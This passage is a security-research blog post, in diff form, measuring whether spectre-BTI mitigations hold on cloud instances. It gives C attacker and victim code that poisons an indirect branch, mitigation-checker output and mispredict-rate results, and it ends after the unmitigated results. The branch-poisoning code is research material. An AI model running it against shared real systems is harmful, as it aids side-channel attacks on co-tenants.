@@ -1,0 +1,622 @@
+<!doctype html><html class=no-js lang=en><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><title>Hyperbleed - Current state of spectre-BTI mitigations on cloud - GRIS Blog</title>
+<script>(function(e,t){e[t]=e[t].replace("no-js","js")})(document.documentElement,"className")</script><meta name=description content="Current state of spectre-BTI mitigations on cloud"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="http://blog.gris.dcc.ufrj.br/images/GRIS_logo.png"><meta name=twitter:title content="Hyperbleed - Current state of spectre-BTI mitigations on cloud"><meta name=twitter:description content="Current state of spectre-BTI mitigations on cloud"><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=dns-prefetch href=//fonts.googleapis.com><link rel=dns-prefetch href=//fonts.gstatic.com><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700"><link rel=stylesheet href=/css/style.css><link rel="shortcut icon" href=/favicon.ico><script async src="https://www.googletagmanager.com/gtag/js?id=G-YWN8S4BKK0"></script><script>var dnt,doNotTrack=!1;if(!1&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-YWN8S4BKK0")}</script></head><body class=body><div class="container container--outer"><header class=header><div class="container header__container"><div class="logo logo--mixed"><a class=logo__link href=/en/ title=GRIS rel=home><div class="logo__item logo__imagebox"><img class=logo__img src=/images/gris-logo-2020%27s_black.png></div><div class="logo__item logo__text"><div class=logo__title>GRIS</div><div class=logo__tagline>Grupo de Respostas a Incidentes de Segurança</div></div></a></div><nav class=menu><button class=menu__btn aria-haspopup=true aria-expanded=false tabindex=0>
+<span class=menu__btn-title tabindex=-1>Menu</span></button><ul class=menu__list><li class=menu__item><a class=menu__link href=/en/about/><span class=menu__text>About GRIS</span></a></li></ul></nav></div></header><div class="wrapper flex"><div class=primary><main class=main role=main><article class=post><header class=post__header><h1 class=post__title>Hyperbleed - Current state of spectre-BTI mitigations on cloud</h1><div class="post__meta meta"><div class="meta__item-datetime meta__item"><svg class="meta__icon icon icon-time" width="16" height="14" viewBox="0 0 30 28"><path d="M15 0a14 14 0 110 28 1 1 0 010-28m0 3a3 3 0 100 22 3 3 0 000-22m1 4h-2v8.4l6.8 4.4L22 18l-6-3.8z"/></svg>
+<time class=meta__text datetime=2023-05-29T00:00:00Z>May 29, 2023</time></div></div></header><div class="content post__content clearfix"><h2 id=version-10>Version 1.0</h2><h2 id=introduction>Introduction</h2><p>During our tests for reverse spectre attacks <sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup><sup id=fnref:2><a href=#fn:2 class=footnote-ref role=doc-noteref>2</a></sup><sup id=fnref:3><a href=#fn:3 class=footnote-ref role=doc-noteref>3</a></sup>, we have observed that the behavior of the spectre-BTI<sup id=fnref:4><a href=#fn:4 class=footnote-ref role=doc-noteref>4</a></sup> mitigations differs between a bare-metal and a cloud-based scenario.</p><p>The Linux kernel allows userspace processes to enable mitigations by calling prctl<sup id=fnref:5><a href=#fn:5 class=footnote-ref role=doc-noteref>5</a></sup> with the PR_GET_SPECULATION_CTRL which disables the speculation feature or by using seccomp<sup id=fnref:6><a href=#fn:6 class=footnote-ref role=doc-noteref>6</a></sup>. The default behavior changed over time (from using IBPB/STIBP to IBRS).</p><p>We have measured that on some instances of Google, AWS, Azure and Oracle, the spectre-BTI mitigation using prctl still leaves the victim exposed to attacks in some cases. In this research, we tested multiple scenarios in an attempt to enumerate the causes of failure for the mitigations.</p><p>Note: The title <em>hyperbleed</em> is just a joke/meme/trolling and a way of internally tracking the bug.</p><h2 id=current-hardware-mitigations-and-their-software-interfaces-on-the-linux-kernel>Current Hardware Mitigations (and their software interfaces on the Linux Kernel)</h2><p>The following IA32_SPEC_CTRL and IA32_PRED_CMD Model Specific Registers can be used to mitigate spectre-BTI<sup id=fnref:7><a href=#fn:7 class=footnote-ref role=doc-noteref>7</a></sup>:</p><p><img src=https://i.imgur.com/cTKKs9S.png alt></p><p><img src=https://i.imgur.com/lSxNcMZ.png alt></p><p>AMD CPUs are compatible with those definitions <sup id=fnref:8><a href=#fn:8 class=footnote-ref role=doc-noteref>8</a></sup>. For a complete breakdown on the different mitigations and the recommended usages, refer to Intel&rsquo;s guidance <sup id=fnref:9><a href=#fn:9 class=footnote-ref role=doc-noteref>9</a></sup>.</p><h3 id=indirect-branch-restricted-speculation-ibrs>Indirect Branch Restricted Speculation (IBRS)</h3><p>IBRS is a hardware mitigation used to prevent code from a less privileged mode to control branches executed on a more privileged mode <sup id=fnref:10><a href=#fn:10 class=footnote-ref role=doc-noteref>10</a></sup>. This mitigation is used to prevent spectre-BTI attacks against higher privileged security domains, such as kernel or host in the case of a VMM.</p><p>To enable the mitigation it is necessary to perform a write on a Model Specific Register (IA32_SPEC_CTRL.IBRS = 1, or MSR_72[0]=1) every time a context change happens from an untrusted context.</p><p>IBRS can also be used to mitigate user-level attacks, according to Intel guidance <sup id=fnref1:10><a href=#fn:10 class=footnote-ref role=doc-noteref>10</a></sup>:</p><pre tabindex=0><code>Additionally, when IA32_SPEC_CTRL.IBRS is set to 1 on any logical processors of that core, the predicted targets of indirect branches cannot be controlled by software that executes (or executed previously) on another logical processor of the same core.
+</code></pre><h3 id=enhanced-ibrs>Enhanced IBRS</h3><p>eIBRS supports an &lsquo;always on&rsquo; mode for the IBRS (so the bit has to be set only once) <sup id=fnref2:10><a href=#fn:10 class=footnote-ref role=doc-noteref>10</a></sup>.</p><h3 id=single-thread-indirect-branch-predictors-stibp>Single Thread Indirect Branch Predictors (STIBP)</h3><p>STIBP prevents code from controlling branches executed on a sibling thread. STIBP doesn&rsquo;t restrict previous branches from controlling future branches, therefore an IBPB must also be used.</p><h3 id=indirect-branch-predictor-barrier-ibpb>Indirect Branch Predictor Barrier (IBPB)</h3><p>The IBPB is used to prevent future branches from being affected by old branches recorded before issuing IBPB. The IBPB isn&rsquo;t an operation mode but an instruction to clear (flush) the Branch Predictor Unit (BPU). It can be used to prevent untrusted software from controlling each other when executing at the same privilege level and same core. IBPB can be executed on process context switches to mitigate spectre-BTI.</p><h3 id=the-prctl-syscall-with-pr_set_speculation_ctrl-option>The PRCTL syscall with PR_SET_SPECULATION_CTRL option</h3><p>The prctl syscall allows the user to set mitigations for the current process <sup id=fnref:11><a href=#fn:11 class=footnote-ref role=doc-noteref>11</a></sup>. The Linux kernel uses a combination of the previously discussed hardware mitigations to protect user processes against attacks from other user applications <sup id=fnref:12><a href=#fn:12 class=footnote-ref role=doc-noteref>12</a></sup>.</p><p>The mitigation for spectre-BTI can be enabled with:</p><p><code>prctl(PR_SET_SPECULATION_CTRL, PR_SPEC_INDIRECT_BRANCH, PR_SPEC_DISABLE, 0, 0);</code></p><p>Similarly, the mitigation can be enabled inby using seccomp <sup id=fnref:13><a href=#fn:13 class=footnote-ref role=doc-noteref>13</a></sup><sup id=fnref1:6><a href=#fn:6 class=footnote-ref role=doc-noteref>6</a></sup>:</p><p><code>syscall(SYS_seccomp,SECCOMP_SET_MODE_STRICT,0,0);</code></p><h2 id=test-code>Test Code</h2><p>The test consists of two processes. The attacker constantly poisons an indirect call to speculatively redirect it to a target address. The victim process measures the mispredict rate and tries to mitigate the attack either by calling PRCTL or writing to the MSR directly using a kernel module that exposes MSR read and write operations to userspace.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-.c data-lang=.c><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>/*
+</span></span></span><span style=display:flex><span><span style=color:#75715e>gcc -o victim test.c -O0 -masm=intel -w 		-DVICTIM 
+</span></span></span><span style=display:flex><span><span style=color:#75715e>gcc -o victim-PRCTL test.c -O0 -masm=intel -w 	-DVICTIM  -DPRCTL
+</span></span></span><span style=display:flex><span><span style=color:#75715e>gcc -o victim-nospecctrl test.c -O0 -masm=intel -w 	-DVICTIM  -DMSR  -DMSR_VAL=0
+</span></span></span><span style=display:flex><span><span style=color:#75715e>gcc -o victim-IBRS test.c -O0 -masm=intel -w 	-DVICTIM  -DMSR  -DMSR_VAL=1
+</span></span></span><span style=display:flex><span><span style=color:#75715e>gcc -o victim-STIBP test.c -O0 -masm=intel -w 	-DVICTIM  -DMSR  -DMSR_VAL=2
+</span></span></span><span style=display:flex><span><span style=color:#75715e>gcc -o victim-IBPB test.c -O0 -masm=intel -w 	-DVICTIM  -DMSR  -DMSR_VAL=0 -DIBPB
+</span></span></span><span style=display:flex><span><span style=color:#75715e>gcc -o attacker test.c -O0 -masm=intel -w  
+</span></span></span><span style=display:flex><span><span style=color:#75715e>*/</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&#34;utils.h&#34;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/prctl.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#ifndef PRINT_AMMOUNT
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#define PRINT_AMMOUNT 1000
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#endif
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#define IA32_SPEC_CTRL 72
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>uint8_t</span> <span style=color:#f92672>*</span>rdiPtr;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>uint8_t</span> unused[<span style=color:#ae81ff>0x500</span>];
+</span></span><span style=display:flex><span><span style=color:#66d9ef>uint8_t</span> probeArray[<span style=color:#ae81ff>0x1000</span>] <span style=color:#f92672>=</span> {<span style=color:#ae81ff>2</span>};
+</span></span><span style=display:flex><span><span style=color:#66d9ef>uint8_t</span> unuse2[<span style=color:#ae81ff>0x500</span>];
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>uint32_t</span> <span style=color:#a6e22e>f1</span>() {}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>poison</span>(<span style=color:#66d9ef>uint8_t</span> <span style=color:#f92672>*</span>srcAddress, <span style=color:#66d9ef>uint8_t</span> <span style=color:#f92672>*</span>dstAddress, <span style=color:#66d9ef>uint64_t</span> cpu)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>volatile</span> <span style=color:#66d9ef>uint8_t</span> d;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>unsigned</span> tries <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>unsigned</span> hits <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>unsigned</span> totalHits <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>unsigned</span> totalTries <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>jitForLoop</span>(srcAddress);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> (<span style=color:#ae81ff>1</span>)
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#ifndef VICTIM
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#a6e22e>callGadget</span>(srcAddress, (<span style=color:#66d9ef>uint8_t</span> <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>rdiPtr, (<span style=color:#66d9ef>uint8_t</span> <span style=color:#f92672>*</span>)probeArray);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>continue</span>;
+</span></span><span style=display:flex><span><span style=color:#75715e>#else
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#ifdef IBPB
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#a6e22e>wrmsr_on_cpu</span>(<span style=color:#ae81ff>73</span>, cpu, <span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span><span style=color:#75715e>#endif
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>100</span>; i<span style=color:#f92672>++</span>)
+</span></span><span style=display:flex><span>        {
+</span></span><span style=display:flex><span>            d <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>dstAddress;
+</span></span><span style=display:flex><span>            <span style=color:#a6e22e>flush</span>((<span style=color:#66d9ef>uint8_t</span> <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>rdiPtr);
+</span></span><span style=display:flex><span>            <span style=color:#a6e22e>callGadget</span>(srcAddress, (<span style=color:#66d9ef>uint8_t</span> <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>rdiPtr, (<span style=color:#66d9ef>uint8_t</span> <span style=color:#f92672>*</span>)probeArray);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>probe</span>(<span style=color:#f92672>&amp;</span>probeArray[<span style=color:#ae81ff>0</span>]) <span style=color:#f92672>&lt;</span> THRESHOLD)
+</span></span><span style=display:flex><span>        {
+</span></span><span style=display:flex><span>            hits<span style=color:#f92672>++</span>;
+</span></span><span style=display:flex><span>            totalHits<span style=color:#f92672>++</span>;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        totalTries<span style=color:#f92672>++</span>;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#f92672>++</span>tries <span style=color:#f92672>%</span> PRINT_AMMOUNT <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span>        {
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Rate: %u/%u  MSR[72]=%d</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, hits, tries,<span style=color:#a6e22e>rdmsr_on_cpu</span>(IA32_SPEC_CTRL,cpu));
+</span></span><span style=display:flex><span>            
+</span></span><span style=display:flex><span>            <span style=color:#75715e>#ifdef MSR
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#a6e22e>wrmsr_on_cpu</span>(IA32_SPEC_CTRL, cpu, MSR_VAL);
+</span></span><span style=display:flex><span>            <span style=color:#75715e>#endif
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>            tries <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>            hits <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (totalTries <span style=color:#f92672>&gt;=</span> PRINT_AMMOUNT <span style=color:#f92672>*</span> <span style=color:#ae81ff>10</span>)
+</span></span><span style=display:flex><span>            {
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>            }
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>usleep</span>(<span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span><span style=color:#75715e>#endif
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Total misspredict rate: %d/%d (%.2f %)</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, totalHits, totalTries, (<span style=color:#66d9ef>float</span>)totalHits <span style=color:#f92672>*</span> <span style=color:#ae81ff>100</span> <span style=color:#f92672>/</span> (<span style=color:#66d9ef>float</span>)totalTries);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>argv)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>uint64_t</span> srcAddress;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>uint64_t</span> dstAddress;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>uint64_t</span> cpu;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (argc <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>4</span>)
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Usage:   %s &lt;srcAddress&gt; &lt;dstAddress&gt; &lt;cpuCore&gt; </span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, argv[<span style=color:#ae81ff>0</span>]);
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Example: %s 0x55555554123 0x55555555345 1 </span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, argv[<span style=color:#ae81ff>0</span>]);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    srcAddress <span style=color:#f92672>=</span> (<span style=color:#66d9ef>uint64_t</span>)<span style=color:#a6e22e>strtoull</span>(argv[<span style=color:#ae81ff>1</span>], NULL, <span style=color:#ae81ff>16</span>);
+</span></span><span style=display:flex><span>    dstAddress <span style=color:#f92672>=</span> (<span style=color:#66d9ef>uint64_t</span>)<span style=color:#a6e22e>strtoull</span>(argv[<span style=color:#ae81ff>2</span>], NULL, <span style=color:#ae81ff>16</span>);
+</span></span><span style=display:flex><span>    cpu <span style=color:#f92672>=</span> (<span style=color:#66d9ef>uint64_t</span>)<span style=color:#a6e22e>strtoull</span>(argv[<span style=color:#ae81ff>3</span>], NULL, <span style=color:#ae81ff>16</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>SetCoreAffinity</span>(cpu);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>uint8_t</span> <span style=color:#f92672>*</span>rwx1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>requestMem</span>((<span style=color:#66d9ef>uint8_t</span> <span style=color:#f92672>*</span>)(srcAddress <span style=color:#f92672>&amp;</span> (<span style=color:#f92672>~</span><span style=color:#ae81ff>0xfffULL</span>)), <span style=color:#ae81ff>0x1000</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>uint8_t</span> <span style=color:#f92672>*</span>rwx2 <span style=color:#f92672>=</span> <span style=color:#a6e22e>requestMem</span>((<span style=color:#66d9ef>uint8_t</span> <span style=color:#f92672>*</span>)(dstAddress <span style=color:#f92672>&amp;</span> (<span style=color:#f92672>~</span><span style=color:#ae81ff>0xfffULL</span>)), <span style=color:#ae81ff>0x1000</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#ifdef PRCTL
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>prctl</span>(PR_SET_SPECULATION_CTRL, PR_SPEC_INDIRECT_BRANCH, PR_SPEC_FORCE_DISABLE, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>perror</span>(<span style=color:#e6db74>&#34;prctl&#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;PRCTL GET value 0x%x</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, <span style=color:#a6e22e>prctl</span>(PR_GET_SPECULATION_CTRL, PR_SPEC_INDIRECT_BRANCH, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>));
+</span></span><span style=display:flex><span><span style=color:#75715e>#endif
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#ifdef MSR
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;current value msr[%d]=%d on core %d</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, IA32_SPEC_CTRL, <span style=color:#a6e22e>rdmsr_on_cpu</span>(IA32_SPEC_CTRL, cpu), cpu);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>wrmsr_on_cpu</span>(IA32_SPEC_CTRL, cpu, MSR_VAL);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;writing msr[%d]=%d on core %d </span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, IA32_SPEC_CTRL, MSR_VAL, cpu);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;current value msr[%d]=%d on core %d</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, IA32_SPEC_CTRL, <span style=color:#a6e22e>rdmsr_on_cpu</span>(IA32_SPEC_CTRL, cpu), cpu);
+</span></span><span style=display:flex><span><span style=color:#75715e>#endif
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>// set up leak gadget into position
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e>#ifdef VICTIM
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    rdiPtr <span style=color:#f92672>=</span> (<span style=color:#66d9ef>uint8_t</span> <span style=color:#f92672>*</span>)f1;
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>copyLeakGadget</span>(dstAddress);
+</span></span><span style=display:flex><span><span style=color:#75715e>#else
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    rdiPtr <span style=color:#f92672>=</span> (<span style=color:#66d9ef>uint8_t</span> <span style=color:#f92672>*</span>)dstAddress;
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>copyRetGadget</span>(dstAddress);
+</span></span><span style=display:flex><span><span style=color:#75715e>#endif
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>poison</span>(srcAddress, dstAddress, cpu);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#ifdef MSR
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;current value msr[%d]=%d on core %d</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, IA32_SPEC_CTRL, <span style=color:#a6e22e>rdmsr_on_cpu</span>(IA32_SPEC_CTRL, cpu), cpu);
+</span></span><span style=display:flex><span><span style=color:#75715e>#endif
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><h3 id=disclaimer>Disclaimer</h3><p>We have identified that the test code sometimes might produce false negatives (low misprediction rate). Retrying the execution can lead to greater misprediction rate values, indicating the vulnerability.</p><h2 id=control-test-setup-bare-metal>Control Test Setup (Bare Metal)</h2><p>We used the spectre_meltdown_checker<sup id=fnref:14><a href=#fn:14 class=footnote-ref role=doc-noteref>14</a></sup> to verify the spectre v2 mitigations available for the machine used as control:</p><pre tabindex=0><code>$ sudo ./spectre-meltdown-checker.sh
+Spectre and Meltdown mitigation detection tool v0.45
+
+Checking for vulnerabilities on current system
+Kernel is Linux 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
+CPU is Intel(R) Core(TM) i7-4790 CPU @ 3.60GHz
+
+Hardware check
+* Hardware support (CPU microcode) for mitigation techniques
+  * Indirect Branch Restricted Speculation (IBRS)
+    * SPEC_CTRL MSR is available:  YES
+    * CPU indicates IBRS capability:  YES  (SPEC_CTRL feature bit)
+  * Indirect Branch Prediction Barrier (IBPB)
+    * CPU indicates IBPB capability:  YES  (SPEC_CTRL feature bit)
+  * Single Thread Indirect Branch Predictors (STIBP)
+    * SPEC_CTRL MSR is available:  YES
+    * CPU indicates STIBP capability:  YES  (Intel STIBP feature bit)
+[...]
+
+* CPU vulnerability to the speculative execution attack variants
+  * Affected by CVE-2017-5753 (Spectre Variant 1, bounds check bypass):  YES
+  * Affected by CVE-2017-5715 (Spectre Variant 2, branch target injection):  YES
+[...]
+
+CVE-2017-5715 aka &#39;Spectre Variant 2, branch target injection&#39;
+* Mitigated according to the /sys interface:  YES  (Mitigation: Retpolines, IBPB: conditional, IBRS_FW, STIBP: conditional, RSB filling, PBRSB-eIBRS: Not affected)
+
+* Mitigation 1
+  * Kernel is compiled with IBRS support:  YES
+    * IBRS enabled and active:  YES  (for firmware code only)
+  * Kernel is compiled with IBPB support:  YES
+    * IBPB enabled and active:  YES
+* Mitigation 2
+  * Kernel has branch predictor hardening (arm):  NO
+  * Kernel compiled with retpoline option:  YES
+    * Kernel compiled with a retpoline-aware compiler:  YES  (kernel reports full retpoline compilation)
+&gt; STATUS:  NOT VULNERABLE  (Full retpoline + IBPB are mitigating the vulnerability)
+[...]
+
+&gt; SUMMARY: CVE-2017-5753:OK CVE-2017-5715:OK CVE-2017-5754:OK CVE-2018-3640:OK CVE-2018-3639:OK CVE-2018-3615:OK CVE-2018-3620:OK CVE-2018-3646:OK CVE-2018-12126:OK CVE-2018-12130:OK CVE-2018-12127:OK CVE-2019-11091:OK CVE-2019-11135:OK CVE-2018-12207:OK CVE-2020-0543:OK
+</code></pre><p>This shows that the CPU has support for IBRS, IBPB and STIBP.</p><p>All the executed tests run the attacker process on core 0. The arguments <code>0x55555554123</code> and <code>0x55555555345</code> are just the source and the destination of the branch and are the same for the victim and the attacker. The third argument is the core to be pinned.</p><p>The MSR module (from msr-tools) must be loaded too.</p><pre tabindex=0><code>$ ./attacker 0x55555554123 0x55555555345 0 &amp;
+$ sudo modprobe msr
+</code></pre><p>For the mitigation test using the IA32_SPEC_CTRL MSR, we write the desired value to the register and check if the written value stays the same until the remainder of the test, otherwise the result is discarded. Sometimes the kernel may overwrite the value on the MSR, thus disabling the mitigation, but writing to the MSR before every branch disrupts the test flow and yields wrong results.</p><p>Example of a false positive:</p><pre tabindex=0><code>Testing victim-IBRS on core 0:
+current value msr[72]=0 on core 0
+writing msr[72]=1 on core 0
+current value msr[72]=1 on core 0
+Rate: 0/1000  MSR[72]=1
+Rate: 0/1000  MSR[72]=1
+Rate: 667/1000  MSR[72]=0 //this bin should be discarded
+Rate: 0/1000  MSR[72]=1
+Rate: 0/1000  MSR[72]=1
+Rate: 0/1000  MSR[72]=1
+Rate: 0/1000  MSR[72]=1
+Rate: 0/1000  MSR[72]=1
+Rate: 0/1000  MSR[72]=1
+Rate: 0/1000  MSR[72]=1
+
+Total misspredict rate: 667/10000 (6.67 %) //actual misspredict rate = 0% (0/9000)
+current value msr[72]=1 on core 0
+</code></pre><h3 id=no-mitigation>No mitigation</h3><p>Then we execute the victim code on either core 0 or its sibling thread (core 4 in this case). For the control victim code the results are:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>Testing victim on core 0: 
+</span></span><span style=display:flex><span>Rate: 998/1000  MSR[72]=0
+</span></span><span style=display:flex><span>Rate: 997/1000  MSR[72]=0
+</span></span><span style=display:flex><span>Rate: 1000/1000  MSR[72]=0
+</span></span><span style=display:flex><span>Rate: 999/1000  MSR[72]=0
+</span></span><span style=display:flex><span>Rate: 1000/1000  MSR[72]=0
+</span></span><span style=display:flex><span>Rate: 1000/1000  MSR[72]=0
+</span></span><span style=display:flex><span>Rate: 1000/1000  MSR[72]=0
+</span></span><span style=display:flex><span>Rate: 1000/1000  MSR[72]=0
+</span></span><span style=display:flex><span>Rate: 1000/1000  MSR[72]=0
+</span></span><span style=display:flex><span>Rate: 1000/1000  MSR[72]=0
+</span></span><span style=display:flex><span>Total mispredict rate: 9994/10000 (99.94 %)
